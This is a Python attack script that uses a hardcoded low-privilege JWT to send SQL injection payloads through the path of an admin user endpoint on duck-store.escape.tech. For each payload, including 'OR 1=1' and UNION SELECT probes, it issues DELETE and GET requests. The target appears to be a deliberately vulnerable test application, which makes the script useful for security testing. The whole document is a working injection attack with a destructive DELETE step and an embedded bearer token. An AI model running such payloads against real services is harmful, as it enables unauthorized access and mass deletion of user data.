import requests

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYzc3NjY3ZjktMjY3OC00MzU1LWJjN2MtODIwYmU4M2U0YzU4IiwidXNlcm5hbWUiOiJhdHRrdXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY4NDcwM30.Eu6rZyvdccrNfPiLt-O6iDbFdX2FWkST4Rteg1yQ4PM"

headers = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

# Try with SQL injection in path
payloads = [
    "testuserB'",
    "testuserB'--",
    "testuserB' OR '1'='1",
    "testuserB' OR 1=1--",
    "testuserB' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
    "' OR 1=1--",
    "testuserB' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
]

for payload in payloads:
    url = f"https://duck-store.escape.tech/api/v1/admin/users/{payload}"
    resp = requests.delete(url, headers=headers)
    print(f"DELETE {payload[:30]}: {resp.status_code} - {resp.text[:200]}")
    
    resp = requests.get(url, headers=headers)
    print(f"GET {payload[:30]}: {resp.status_code} - {resp.text[:200]}")